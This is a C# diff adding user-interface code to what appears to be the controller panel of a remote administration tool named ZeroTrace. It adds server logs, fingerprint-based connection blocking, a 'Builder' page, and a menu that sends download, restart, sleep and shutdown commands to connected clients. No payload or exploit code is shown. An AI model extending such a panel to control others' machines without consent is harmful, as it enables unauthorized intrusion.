@@ -4252,4 +4252,1667 @@ namespace ZeroTrace_Security_Official
                 AllowUserToAddRows = false,
                 AllowUserToDeleteRows = false,
                 AllowUserToResizeRows = false,
-             
+                AllowUserToResizeColumns = false,
+                AutoGenerateColumns = false,
+                MultiSelect = false,
+                ReadOnly = true,
+                SelectionMode = DataGridViewSelectionMode.FullRowSelect,
+                EnableHeadersVisualStyles = false,
+                RowTemplate = { Height = 30 },
+                Name = "serverLogsGrid"
+            };
+            serverLogsGrid.DefaultCellStyle.BackColor = Color.FromArgb(20, 20, 20);
+            serverLogsGrid.DefaultCellStyle.SelectionBackColor = Color.FromArgb(20, 20, 20);
+            serverLogsGrid.DefaultCellStyle.SelectionForeColor = Color.White;
+            serverLogsGrid.DefaultCellStyle.Font = new Font("Consolas", 9F);
+            serverLogsGrid.DefaultCellStyle.Padding = new Padding(14, 0, 14, 0);
+            serverLogsGrid.RowTemplate.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleLeft;
+
+            DataGridViewTextBoxColumn valueColumn = new DataGridViewTextBoxColumn
+            {
+                Name = "Value",
+                HeaderText = "Value",
+                AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill,
+                FillWeight = 50F,
+                MinimumWidth = 120,
+                SortMode = DataGridViewColumnSortMode.NotSortable
+            };
+            DataGridViewTextBoxColumn statusColumn = new DataGridViewTextBoxColumn
+            {
+                Name = "Status",
+                HeaderText = "Status",
+                AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill,
+                FillWeight = 50F,
+                MinimumWidth = 120,
+                SortMode = DataGridViewColumnSortMode.NotSortable
+            };
+            serverLogsGrid.Columns.Add(valueColumn);
+            serverLogsGrid.Columns.Add(statusColumn);
+            serverLogsGrid.CellPainting += delegate(object sender, DataGridViewCellPaintingEventArgs e)
+            {
+                if (e.RowIndex < 0 || e.ColumnIndex < 0)
+                    return;
+
+                e.PaintBackground(e.CellBounds, false);
+                string text = Convert.ToString(e.FormattedValue) ?? string.Empty;
+                Rectangle textRect = new Rectangle(
+                    e.CellBounds.X + 14,
+                    e.CellBounds.Y + 1,
+                    Math.Max(0, e.CellBounds.Width - 28),
+                    Math.Max(0, e.CellBounds.Height - 2));
+                TextFormatFlags flags = TextFormatFlags.Left | TextFormatFlags.VerticalCenter |
+                    TextFormatFlags.NoPrefix | TextFormatFlags.EndEllipsis;
+                Color foreColor = e.CellStyle.ForeColor.IsEmpty ? Color.White : e.CellStyle.ForeColor;
+                TextRenderer.DrawText(e.Graphics, text, serverLogsGrid.Font, textRect, foreColor, flags);
+                e.Handled = true;
+            };
+            serverLogsGrid.SelectionChanged += delegate { serverLogsGrid.ClearSelection(); };
+
+            serverLogsTabPage.Controls.Add(serverLogsGrid);
+            serverLogsTabPage.Controls.Add(header);
+        }
+
+        private void InitializeBlockedConnectionsPage()
+        {
+            blockedConnectionsTabPage.Text = "Blocked Connections";
+            blockedConnectionsTabPage.BackColor = ColorTranslator.FromHtml("#262626");
+            blockedConnectionsTabPage.Padding = new Padding(0);
+
+            blockedConnectionsGrid = new DevExpress.XtraGrid.GridControl
+            {
+                Dock = DockStyle.Fill,
+                Name = "blockedConnectionsGrid"
+            };
+            blockedConnectionsGridView = new DevExpress.XtraGrid.Views.Grid.GridView(blockedConnectionsGrid);
+            blockedConnectionsGrid.MainView = blockedConnectionsGridView;
+            blockedConnectionsGrid.ViewCollection.Add(blockedConnectionsGridView);
+            blockedConnectionsGridView.OptionsBehavior.Editable = false;
+            blockedConnectionsGridView.OptionsSelection.EnableAppearanceFocusedCell = false;
+            blockedConnectionsGridView.OptionsSelection.EnableAppearanceFocusedRow = true;
+            blockedConnectionsGridView.OptionsView.ShowGroupPanel = false;
+            blockedConnectionsGridView.OptionsView.ColumnAutoWidth = false;
+            blockedConnectionsGridView.RowHeight = 32;
+            blockedConnectionsGridView.RowStyle += delegate(object sender, DevExpress.XtraGrid.Views.Grid.RowStyleEventArgs e)
+            {
+                if (e.RowHandle >= 0 && blockedConnectionsGridView.IsRowSelected(e.RowHandle))
+                {
+                    e.Appearance.BackColor = ColorTranslator.FromHtml("#1A2028");
+                    e.Appearance.ForeColor = Color.White;
+                    e.HighPriority = true;
+                }
+            };
+
+            blockedConnectionsTable = new DataTable("BlockedConnections");
+            blockedConnectionsTable.Columns.Add("IP", typeof(string));
+            blockedConnectionsTable.Columns.Add("UserName", typeof(string));
+            blockedConnectionsTable.Columns.Add("Fingerprint", typeof(string));
+            blockedConnectionsGrid.DataSource = blockedConnectionsTable;
+
+            blockedConnectionsPopupMenu = new DevExpress.XtraBars.PopupMenu(fluentFormDefaultManager1)
+            {
+                Name = "blockedConnectionsPopupMenu",
+                MinWidth = ContextParentMenuWidth
+            };
+            blockedConnectionsAddItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Add")
+            {
+                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
+            };
+            blockedConnectionsRemoveItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Remove")
+            {
+                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
+            };
+            blockedConnectionsAddItem.ImageOptions.Image = null;
+            blockedConnectionsAddItem.ImageOptions.SvgImage = null;
+            blockedConnectionsRemoveItem.ImageOptions.Image = null;
+            blockedConnectionsRemoveItem.ImageOptions.SvgImage = null;
+            blockedConnectionsAddItem.ItemClick += delegate { ShowAddBlockedFingerprintDialog(); };
+            blockedConnectionsRemoveItem.ItemClick += delegate { RemoveSelectedBlockedConnection(); };
+            blockedConnectionsPopupMenu.AddItem(blockedConnectionsAddItem);
+            blockedConnectionsPopupMenu.AddItem(blockedConnectionsRemoveItem);
+
+            blockedConnectionsGrid.MouseDown += BlockedConnectionsGrid_MouseDown;
+            blockedConnectionsGrid.MouseUp += delegate(object sender, MouseEventArgs e)
+            {
+                if (e.Button == MouseButtons.Right && blockedConnectionsPopupMenu != null)
+                    blockedConnectionsPopupMenu.ShowPopup(Control.MousePosition);
+            };
+
+            blockedConnectionsTabPage.Controls.Add(blockedConnectionsGrid);
+            ReloadBlockedConnectionsGrid();
+        }
+
+        private void BlockedConnectionsGrid_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button != MouseButtons.Right || blockedConnectionsGridView == null)
+                return;
+
+            DevExpress.XtraGrid.Views.Grid.ViewInfo.GridHitInfo hit =
+                blockedConnectionsGridView.CalcHitInfo(e.Location);
+            if (hit.InRow && hit.RowHandle >= 0 && !blockedConnectionsGridView.IsRowSelected(hit.RowHandle))
+            {
+                blockedConnectionsGridView.ClearSelection();
+                blockedConnectionsGridView.SelectRow(hit.RowHandle);
+                blockedConnectionsGridView.FocusedRowHandle = hit.RowHandle;
+            }
+        }
+
+        private void ReloadBlockedConnectionsGrid()
+        {
+            if (blockedConnectionsTable == null)
+                return;
+
+            blockedConnectionsTable.Rows.Clear();
+            foreach (BlockedConnectionRecord record in blockedConnectionStore.GetAll())
+            {
+                DataRow row = blockedConnectionsTable.NewRow();
+                row["IP"] = record.Ip;
+                row["UserName"] = record.UserName;
+                row["Fingerprint"] = record.Fingerprint;
+                blockedConnectionsTable.Rows.Add(row);
+            }
+
+            if (blockedConnectionsGridView != null)
+            {
+                if (blockedConnectionsGridView.Columns["IP"] != null)
+                {
+                    blockedConnectionsGridView.Columns["IP"].Caption = "IP Address";
+                    blockedConnectionsGridView.Columns["IP"].Width = 180;
+                }
+                if (blockedConnectionsGridView.Columns["UserName"] != null)
+                {
+                    blockedConnectionsGridView.Columns["UserName"].Caption = "User Name";
+                    blockedConnectionsGridView.Columns["UserName"].Width = 240;
+                }
+                if (blockedConnectionsGridView.Columns["Fingerprint"] != null)
+                {
+                    blockedConnectionsGridView.Columns["Fingerprint"].Caption = "Fingerprint";
+                    blockedConnectionsGridView.Columns["Fingerprint"].Width = 420;
+                }
+            }
+        }
+
+        private void ShowAddBlockedFingerprintDialog()
+        {
+            const int width = 480;
+            const int height = 188;
+            using (Form dialog = new Form())
+            {
+                dialog.Text = "Add Blocked Connection";
+                dialog.StartPosition = FormStartPosition.CenterParent;
+                dialog.FormBorderStyle = FormBorderStyle.FixedDialog;
+                dialog.MinimizeBox = false;
+                dialog.MaximizeBox = false;
+                dialog.ShowInTaskbar = false;
+                dialog.ClientSize = new Size(width, height);
+                dialog.BackColor = Color.FromArgb(35, 37, 38);
+                dialog.ForeColor = Color.White;
+                dialog.Font = new Font("Segoe UI", 9F);
+
+                Label label = new Label
+                {
+                    Text = "Fingerprint",
+                    AutoSize = true,
+                    ForeColor = Color.FromArgb(239, 242, 241),
+                    Location = new Point(24, 24)
+                };
+                DevExpress.XtraEditors.TextEdit input = new DevExpress.XtraEditors.TextEdit
+                {
+                    Name = "blockedFingerprintInput",
+                    Location = new Point(24, 52),
+                    Size = new Size(432, 30),
+                    Properties = { NullValuePrompt = "Input a fingerprint to block", NullValuePromptShowForEmptyValue = true },
+                    BackColor = Color.FromArgb(31, 33, 34),
+                    ForeColor = Color.White
+                };
+                Button cancel = new Button
+                {
+                    Text = "Cancel",
+                    DialogResult = DialogResult.Cancel,
+                    FlatStyle = FlatStyle.Flat,
+                    Location = new Point(265, 112),
+                    Size = new Size(88, 32),
+                    BackColor = Color.FromArgb(48, 50, 51),
+                    ForeColor = Color.White
+                };
+                cancel.FlatAppearance.BorderColor = Color.FromArgb(70, 74, 74);
+                Button ok = new Button
+                {
+                    Text = "OK",
+                    FlatStyle = FlatStyle.Flat,
+                    Location = new Point(368, 112),
+                    Size = new Size(88, 32),
+                    BackColor = Color.FromArgb(48, 50, 51),
+                    ForeColor = Color.White
+                };
+                ok.FlatAppearance.BorderColor = Color.FromArgb(70, 74, 74);
+                ok.Click += delegate
+                {
+                    string fingerprint = BlockedConnectionStore.NormalizeFingerprint(input.Text);
+                    if (fingerprint.Length == 0)
+                    {
+                        MessageBox.Show(dialog, "Enter a valid 64-character fingerprint.", "Blocked Connection", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        return;
+                    }
+                    blockedConnectionStore.Add(fingerprint, "Unknown", "Unknown");
+                    ReloadBlockedConnectionsGrid();
+                    LogServerEvent("Fingerprint blocked: " + fingerprint, LogType.Warning);
+                    dialog.DialogResult = DialogResult.OK;
+                    dialog.Close();
+                };
+
+                dialog.Controls.Add(label);
+                dialog.Controls.Add(input);
+                dialog.Controls.Add(cancel);
+                dialog.Controls.Add(ok);
+                dialog.AcceptButton = ok;
+                dialog.CancelButton = cancel;
+                dialog.ShowDialog(this);
+            }
+        }
+
+        private void RemoveSelectedBlockedConnection()
+        {
+            if (blockedConnectionsGridView == null)
+                return;
+            int rowHandle = blockedConnectionsGridView.FocusedRowHandle;
+            if (rowHandle < 0)
+                return;
+
+            string fingerprint = Convert.ToString(blockedConnectionsGridView.GetRowCellValue(rowHandle, "Fingerprint"));
+            if (BlockedConnectionStore.NormalizeFingerprint(fingerprint).Length == 0)
+                return;
+
+            if (blockedConnectionStore.Remove(fingerprint))
+            {
+                ReloadBlockedConnectionsGrid();
+                LogServerEvent("Fingerprint unblocked: " + fingerprint, LogType.Success);
+            }
+        }
+
+        private void BlockSelectedConnections()
+        {
+            int[] rows = gridView == null ? new int[0] : gridView.GetSelectedRows();
+            foreach (int rowHandle in rows)
+            {
+                if (rowHandle < 0)
+                    continue;
+
+                string fingerprint = Convert.ToString(gridView.GetRowCellValue(rowHandle, "Fingerprint"));
+                fingerprint = BlockedConnectionStore.NormalizeFingerprint(fingerprint);
+                if (fingerprint.Length == 0)
+                {
+                    LogServerEvent("Block failed: connection has no valid fingerprint", LogType.Error);
+                    continue;
+                }
+
+                string connectionId = Convert.ToString(gridView.GetRowCellValue(rowHandle, "ConnectionId"));
+                string ip = Convert.ToString(gridView.GetRowCellValue(rowHandle, "IP"));
+                string userName = Convert.ToString(gridView.GetRowCellValue(rowHandle, "UserName"));
+                blockedConnectionStore.Add(fingerprint, ip, userName);
+                CloseConnectionById(connectionId, "Connection blocked");
+                LogServerEvent("Connection blocked: " + fingerprint, LogType.Warning);
+            }
+            ReloadBlockedConnectionsGrid();
+        }
+
+        private void CloseConnectionById(string connectionId, string reason)
+        {
+            if (string.IsNullOrWhiteSpace(connectionId))
+                return;
+
+            TcpClient client = null;
+            lock (connectionStateLock)
+            {
+                connectedClients.TryGetValue(connectionId, out client);
+            }
+            if (client == null)
+                return;
+
+            try { client.Close(); } catch { }
+        }
+
+        private DevExpress.XtraBars.Navigation.AccordionControlElement CreateNavigationItem(string name, string text)
+        {
+            DevExpress.XtraBars.Navigation.AccordionControlElement item = new DevExpress.XtraBars.Navigation.AccordionControlElement();
+            item.Name = name;
+            item.Text = text;
+            item.Style = DevExpress.XtraBars.Navigation.ElementStyle.Item;
+            return item;
+        }
+
+        private int GetCurrentDpi()
+        {
+            int dpi = DeviceDpi;
+            return dpi > 0 ? dpi : 96;
+        }
+
+        private static int ScaleLogicalPixels(int logicalPixels, int dpi)
+        {
+            return Math.Max(1, (int)Math.Round(logicalPixels * dpi / 96.0, MidpointRounding.AwayFromZero));
+        }
+
+        private void ApplySidebarLayoutForDpi(int dpi, bool forceExpandedWidth)
+        {
+            if (accordionControl1 == null)
+                return;
+
+            // DevExpress/FluentDesignForm owns the collapsed navigation width. Only
+            // impose our 240-logical-pixel target when the rail is expanded; otherwise
+            // preserve the control's collapsed state instead of accidentally forcing it
+            // back open during a monitor-DPI transition.
+            if (forceExpandedWidth)
+                accordionControl1.Width = ScaleLogicalPixels(SidebarWidth, dpi);
+
+            accordionControl1.GroupHeight = ScaleLogicalPixels(SidebarGroupHeight, dpi);
+            accordionControl1.ItemHeight = ScaleLogicalPixels(SidebarItemHeight, dpi);
+
+            // FluentDesignForm/WinForms docking calculates the fill container's
+            // position from the left-docked navigation control. We intentionally do
+            // not force an absolute Location here.
+            if (fluentDesignFormContainer1 != null && fluentDesignFormContainer1.Dock != DockStyle.Fill)
+                fluentDesignFormContainer1.Dock = DockStyle.Fill;
+        }
+
+        protected override void OnDpiChanged(DpiChangedEventArgs e)
+        {
+            base.OnDpiChanged(e);
+
+            int expandedThreshold = ScaleLogicalPixels(200, e.DeviceDpiNew);
+            bool navigationIsExpanded = accordionControl1 != null && accordionControl1.Width >= expandedThreshold;
+            ApplySidebarLayoutForDpi(e.DeviceDpiNew, navigationIsExpanded);
+
+            // Rebind the small vector navigation icons at the new DPI so their
+            // configured SvgImageSize remains crisp instead of bitmap-scaled.
+            ApplySidebarIcons();
+            Invalidate(true);
+        }
+
+        private void ConfigureSidebarAppearance()
+        {
+            // Keep the accordion itself responsible for its own background.  The
+            // hamburger header is a real part of the AccordionControl, so painting
+            // the parent control and the header to the same color prevents the skin
+            // from exposing a separate black strip above the navigation items.
+            accordionControl1.AllowHtmlText = false;
+            ApplySidebarLayoutForDpi(GetCurrentDpi(), true);
+            accordionControl1.ViewType = DevExpress.XtraBars.Navigation.AccordionControlViewType.Standard;
+            accordionControl1.ScrollBarMode = DevExpress.XtraBars.Navigation.ScrollBarMode.Default;
+            accordionControl1.BackColor = SidebarBackgroundColor;
+            accordionControl1.ForeColor = Color.White;
+
+            accordionControlElement1.Text = "Dashboard";
+            accordionControlElement5.Text = "Builder";
+            accordionControlElement9.Text = "System";
+            accordionControlElement12.Text = "About";
+
+            ConfigureSidebarGroupAppearance(accordionControlElement1);
+            ConfigureSidebarGroupAppearance(accordionControlElement5);
+            ConfigureSidebarGroupAppearance(accordionControlElement9);
+            ConfigureSidebarGroupAppearance(accordionControlElement12);
+            ConfigureSidebarItemAppearance(accordionControlElement1);
+            ConfigureSidebarItemAppearance(accordionControlElement5);
+            ConfigureSidebarItemAppearance(accordionControlElement9);
+            ConfigureSidebarItemAppearance(accordionControlElement12);
+            ApplySidebarIcons();
+        }
+
+        private void ConfigureSidebarGroupAppearance(DevExpress.XtraBars.Navigation.AccordionControlElement group)
+        {
+            if (group == null) return;
+            Font groupFont = new Font("Segoe UI Semibold", 10.0F, FontStyle.Bold, GraphicsUnit.Point);
+            group.Appearance.Normal.BackColor = SidebarBackgroundColor;
+            group.Appearance.Normal.ForeColor = Color.White;
+            group.Appearance.Normal.Font = groupFont;
+            group.Appearance.Normal.Options.UseBackColor = true;
+            group.Appearance.Normal.Options.UseForeColor = true;
+            group.Appearance.Normal.Options.UseFont = true;
+            group.Appearance.Hovered.BackColor = SidebarBackgroundColor;
+            group.Appearance.Hovered.ForeColor = Color.White;
+            group.Appearance.Hovered.Font = groupFont;
+            group.Appearance.Hovered.Options.UseBackColor = true;
+            group.Appearance.Hovered.Options.UseForeColor = true;
+            group.Appearance.Hovered.Options.UseFont = true;
+            group.Appearance.Pressed.BackColor = SidebarBackgroundColor;
+            group.Appearance.Pressed.ForeColor = Color.White;
+            group.Appearance.Pressed.Font = groupFont;
+            group.Appearance.Pressed.Options.UseBackColor = true;
+            group.Appearance.Pressed.Options.UseForeColor = true;
+            group.Appearance.Pressed.Options.UseFont = true;
+        }
+
+        private void ConfigureSidebarItemAppearance(DevExpress.XtraBars.Navigation.AccordionControlElement group)
+        {
+            if (group == null) return;
+            foreach (DevExpress.XtraBars.Navigation.AccordionControlElement child in group.Elements)
+            {
+                if (child == null || child.Style != DevExpress.XtraBars.Navigation.ElementStyle.Item) continue;
+                child.Appearance.Normal.ForeColor = SidebarItemTextColor;
+                child.Appearance.Normal.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
+                child.Appearance.Normal.Options.UseForeColor = true;
+                child.Appearance.Normal.Options.UseFont = true;
+                child.Appearance.Hovered.ForeColor = Color.White;
+                child.Appearance.Hovered.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
+                child.Appearance.Hovered.Options.UseForeColor = true;
+                child.Appearance.Hovered.Options.UseFont = true;
+                child.Appearance.Pressed.ForeColor = Color.White;
+                child.Appearance.Pressed.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
+                child.Appearance.Pressed.Options.UseForeColor = true;
+                child.Appearance.Pressed.Options.UseFont = true;
+            }
+        }
+
+        private void AccordionControl1_CustomDrawElement(object sender, DevExpress.XtraBars.Navigation.CustomDrawElementEventArgs e)
+        {
+            if (e == null || e.Element == null)
+                return;
+
+            Rectangle header = e.ObjectInfo.HeaderBounds;
+            int lineLeft = ScaleLogicalPixels(SidebarMenuHorizontalInset, GetCurrentDpi());
+            int lineRight = Math.Max(lineLeft + 24, accordionControl1.ClientSize.Width - ScaleLogicalPixels(SidebarContentRightPadding, GetCurrentDpi()));
+            int lineY = header.Bottom - 7;
+
+            if (e.Element.Style == DevExpress.XtraBars.Navigation.ElementStyle.Group)
+            {
+                e.Handled = true;
+                e.DrawHeaderBackground();
+                e.ObjectInfo.PaintAppearance.ForeColor = Color.White;
+                e.ObjectInfo.PaintAppearance.Font = new Font("Segoe UI Semibold", 10.0F, FontStyle.Bold, GraphicsUnit.Point);
+                e.ObjectInfo.PaintAppearance.Options.UseForeColor = true;
+                e.ObjectInfo.PaintAppearance.Options.UseFont = true;
+                e.DrawImage();
+                e.DrawText();
+                e.DrawExpandCollapseButton();
+
+                // Keep the rule and selected surface clear of the group's native
+                // expand/collapse button at the far right. The item hit-test area
+                // remains full-width; only the painted surface is inset.
+                using (Pen pen = new Pen(Color.FromArgb(106, 108, 108), 1f))
+                    e.Cache.DrawLine(pen, new Point(lineLeft, lineY), new Point(lineRight, lineY));
+                return;
+            }
+
+            if (e.Element.Style == DevExpress.XtraBars.Navigation.ElementStyle.Item)
+            {
+                // Fully own the item surface so the Fluent skin cannot paint its native
+                // hover/shadow adorner across the entire AccordionControl width. The
+                // hover/selected surface is deliberately clipped to the same horizontal
+                // bounds used by the category divider lines.
+                e.Handled = true;
+
+                Rectangle itemBounds = new Rectangle(
+                    lineLeft,
+                    header.Top,
+                    Math.Max(0, lineRight - lineLeft),
+                    header.Height);
+
+                Point cursor = accordionControl1.PointToClient(Control.MousePosition);
+                bool isHovered = header.Contains(cursor);
+                bool isSelected = e.Element == accordionControl1.SelectedElement;
+
+                if (isSelected)
+                {
+                    e.Cache.FillRectangle(SidebarAccentColor, itemBounds);
+                }
+                else if (isHovered)
+                {
+                    // Subtle in-bounds hover tint; no native shadow is allowed to escape
+                    // the same right edge as the category divider.
+                    e.Cache.FillRectangle(Color.FromArgb(57, 55, 56), itemBounds);
+                }
+                else
+                {
+                    e.Cache.FillRectangle(SidebarBackgroundColor, itemBounds);
+                }
+
+                e.ObjectInfo.PaintAppearance.ForeColor = Color.White;
+                e.ObjectInfo.PaintAppearance.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
+                e.ObjectInfo.PaintAppearance.Options.UseForeColor = true;
+                e.ObjectInfo.PaintAppearance.Options.UseFont = true;
+                e.DrawImage();
+                e.DrawText();
+                return;
+            }
+        }
+
+        private void ApplySidebarIcons()
+        {
+            DisposeSidebarIcons();
+            AssignSidebarIcon(accordionControlElement1, "sidebar_dashboard.svg");
+            AssignSidebarIcon(accordionControlElement2, "sidebar_connections.svg");
+            AssignSidebarIcon(accordionControlElement3, "sidebar_server.svg");
+            AssignSidebarIcon(accordionControlElement6, "sidebar_build.svg");
+            AssignSidebarIcon(accordionControlElement7, "sidebar_convert.svg");
+            AssignSidebarIcon(accordionControlElement5, "sidebar_builder.svg");
+            AssignSidebarIcon(accordionControlElement9, "sidebar_system.svg");
+            AssignSidebarIcon(notificationsNavigationElement, "sidebar_notifications.svg");
+            AssignSidebarIcon(serverLogsNavigationElement, "sidebar_notifications.svg");
+            AssignSidebarIcon(pluginManagerNavigationElement, "sidebar_plugin_manager.svg");
+            AssignSidebarIcon(blockedConnectionsNavigationElement, "sidebar_blocked.svg");
+            AssignSidebarIcon(accordionControlElement12, "sidebar_about.svg");
+            AssignSidebarIcon(accordionControlElement13, "sidebar_about_user.svg");
+        }
+
+        private void AssignSidebarIcon(DevExpress.XtraBars.Navigation.AccordionControlElement element, string fileName)
+        {
+            if (element == null) return;
+            SvgImage image = LoadUiSvgImage(fileName);
+            sidebarIconImages.Add(image);
+            element.ImageOptions.Image = null;
+            element.ImageOptions.SvgImage = image;
+            element.ImageOptions.SvgImageSize = new Size(
+                ScaleLogicalPixels(SidebarIconSize, GetCurrentDpi()),
+                ScaleLogicalPixels(SidebarIconSize, GetCurrentDpi()));
+            element.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.None;
+        }
+
+        private static string GetUiIconPath(string fileName)
+        {
+            return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "icons", fileName);
+        }
+
+        private static SvgImage LoadUiSvgImage(string fileName)
+        {
+            string path = GetUiIconPath(fileName);
+            if (!File.Exists(path))
+                throw new FileNotFoundException("Required ZeroTrace UI icon was not deployed.", path);
+
+            using (FileStream stream = File.OpenRead(path))
+                return SvgImage.FromStream(stream);
+        }
+
+        private static void DisposeSvgImages(List<SvgImage> images)
+        {
+            foreach (SvgImage image in images)
+            {
+                IDisposable disposable = image as IDisposable;
+                if (disposable != null)
+                    disposable.Dispose();
+            }
+            images.Clear();
+        }
+
+        private void DisposeSidebarIcons()
+        {
+            DisposeSvgImages(sidebarIconImages);
+        }
+
+        private void DisposeUiIconImages()
+        {
+            DisposeSidebarIcons();
+            DisposeSvgImages(connectionMenuIconImages);
+        }
+
+        private void xtraTabControl1_SelectedPageChanged(object sender, DevExpress.XtraTab.TabPageChangedEventArgs e)
+        {
+            if (e == null || e.Page == null) return;
+            DevExpress.XtraBars.Navigation.AccordionControlElement item = null;
+            if (e.Page == xtraTabPage1) item = accordionControlElement2;
+            else if (e.Page == xtraTabPage2) item = accordionControlElement3;
+            else if (e.Page == autoTasksTabPage) item = autoTasksNavigationElement;
+            else if (e.Page == notificationsTabPage) item = notificationsNavigationElement;
+            else if (e.Page == serverLogsTabPage) item = serverLogsNavigationElement;
+            else if (e.Page == pluginManagerTabPage) item = pluginManagerNavigationElement;
+            else if (e.Page == blockedConnectionsTabPage) item = blockedConnectionsNavigationElement;
+            else if (e.Page == xtraTabPage4) item = null;
+            else if (e.Page == xtraTabPage5) item = accordionControlElement6;
+            else if (e.Page == xtraTabPage6) item = accordionControlElement7;
+            else if (e.Page == xtraTabPage9) item = accordionControlElement13;
+            if (item != null) accordionControl1.SelectedElement = item;
+        }
+
+        private void NavigateToSidebarPage(DevExpress.XtraBars.Navigation.AccordionControlElement element, DevExpress.XtraTab.XtraTabPage page)
+        {
+            if (page == null) return;
+            xtraTabControl1.SelectedTabPage = page;
+            accordionControl1.SelectedElement = element;
+        }
+
+        private void autoTasksNavigationElement_Click(object sender, EventArgs e)
+        {
+            NavigateToSidebarPage(autoTasksNavigationElement, autoTasksTabPage);
+        }
+
+        private void notificationsNavigationElement_Click(object sender, EventArgs e)
+        {
+            NavigateToSidebarPage(notificationsNavigationElement, notificationsTabPage);
+        }
+
+        private void InitializeConnectionsContextMenu()
+        {
+            connectionsContextMenu = new ContextMenuStrip
+            {
+                Name = "connectionsContextMenu",
+                ShowImageMargin = false,
+                ShowCheckMargin = false,
+                AutoClose = true,
+                BackColor = Color.FromArgb(26, 26, 26),
+                ForeColor = Color.White,
+                Font = new Font("Tahoma", 9.75F, FontStyle.Regular, GraphicsUnit.Point)
+            };
+
+            connectionsPopupMenu = new DevExpress.XtraBars.PopupMenu(fluentFormDefaultManager1)
+            {
+                Name = "connectionsPopupMenu",
+                MinWidth = ContextParentMenuWidth,
+                MenuDrawMode = DevExpress.XtraBars.MenuDrawMode.SmallImagesText
+            };
+
+            ConfigureConnectionMenuItems();
+            connectionsContextMenu.Opening += connectionsContextMenu_Opening;
+            ApplyContextMenuToControlTree(xtraTabPage1, connectionsContextMenu);
+            gridControl1.ContextMenuStrip = connectionsContextMenu;
+        }
+
+        private DevExpress.XtraBars.BarButtonItem CreateConnectionMenuItem(string text, EventHandler clickHandler)
+        {
+            DevExpress.XtraBars.BarButtonItem item = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, text);
+            item.ImageOptions.Image = null;
+            item.ImageOptions.SvgImage = null;
+            if (clickHandler != null) item.ItemClick += delegate { clickHandler(item, EventArgs.Empty); };
+            return item;
+        }
+
+        private DevExpress.XtraBars.BarSubItem CreateConnectionMenuGroup(string text, string iconFileName)
+        {
+            DevExpress.XtraBars.BarSubItem item = new DevExpress.XtraBars.BarSubItem(fluentFormDefaultManager1, text);
+            item.PopupMinWidth = ContextMenuWidth;
+            SvgImage icon = LoadUiSvgImage(iconFileName);
+            connectionMenuIconImages.Add(icon);
+            item.ImageOptions.Image = null;
+            item.ImageOptions.SvgImage = icon;
+            item.ImageOptions.SvgImageSize = new Size(16, 16);
+            item.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.None;
+            return item;
+        }
+
+        private void ConfigureConnectionMenuItems()
+        {
+            connectionsPopupMenu.ItemLinks.Clear();
+            DisposeConnectionMenuIcons();
+
+            connectionsAdministrationMenu = CreateConnectionMenuGroup("Administration", "menu_administration.svg");
+            connectionsDownloadOneItem = CreateConnectionMenuItem("Download [ One ]", delegate { ShowAdministrationDialog("Download [ One ]"); });
+            connectionsDownloadTwoItem = CreateConnectionMenuItem("Download [ Two ]", delegate { ShowAdministrationDialog("Download [ Two ]"); });
+            connectionsDownloadUpdateItem = CreateConnectionMenuItem("Download and Update", delegate { ShowAdministrationDialog("Download and Update"); });
+            connectionsAdministrationMenu.AddItem(connectionsDownloadOneItem);
+            connectionsAdministrationMenu.AddItem(connectionsDownloadTwoItem);
+            connectionsAdministrationMenu.AddItem(connectionsDownloadUpdateItem);
+
+            connectionsNetworkingMenu = CreateConnectionMenuGroup("Networking", "menu_networking.svg");
+            connectionsNetworkingMenu.AddItem(CreateConnectionMenuItem("Restart Connection", delegate {
+                if (ShowConnectionConfirmation("Restart Connection"))
+                    SendSelectedConnectionCommand("RECONNECT");
+            }));
+            connectionsCloseItem = CreateConnectionMenuItem("Close Connection", delegate {
+                if (ShowConnectionConfirmation("Close Connection"))
+                    SendSelectedConnectionCommand("CLOSE");
+            });
+            connectionsBlockItem = CreateConnectionMenuItem("Block Connection", delegate {
+                if (ShowConnectionConfirmation("Block Connection"))
+                    BlockSelectedConnections();
+            });
+            connectionsNetworkingMenu.AddItem(connectionsCloseItem);
+            connectionsNetworkingMenu.AddItem(connectionsBlockItem);
+
+            connectionsPluginsMenu = CreateConnectionMenuGroup("Plugins", "menu_plugins.svg");
+            connectionsExPlugin1Item = CreateConnectionMenuItem("ExPlugin 1", delegate { });
+            connectionsExPlugin2Item = CreateConnectionMenuItem("ExPlugin 2", delegate { });
+            connectionsExPlugin3Item = CreateConnectionMenuItem("ExPlugin 3", delegate { });
+            connectionsPluginsMenu.AddItem(connectionsExPlugin1Item);
+            connectionsPluginsMenu.AddItem(connectionsExPlugin2Item);
+            connectionsPluginsMenu.AddItem(connectionsExPlugin3Item);
+
+            connectionsManagementMenu = CreateConnectionMenuGroup("Management", "menu_management.svg");
+            connectionsSleepItem = CreateConnectionMenuItem("Sleep", delegate {
+                if (ShowConnectionConfirmation("Sleep"))
+                    SendSelectedConnectionCommand("SLEEP");
+            });
+            connectionsHibernateItem = CreateConnectionMenuItem("Hibernate", delegate {
+                if (ShowConnectionConfirmation("Hibernate"))
+                    SendSelectedConnectionCommand("HIBERNATE");
+            });
+            connectionsRestartItem = CreateConnectionMenuItem("Restart", delegate {
+                if (ShowConnectionConfirmation("Restart"))
+                    SendSelectedConnectionCommand("RESTART");
+            });
+            connectionsShutdownItem = CreateConnectionMenuItem("Shutdown", delegate {
+                if (ShowConnectionConfirmation("Shutdown"))
+                    SendSelectedConnectionCommand("SHUTDOWN");
+            });
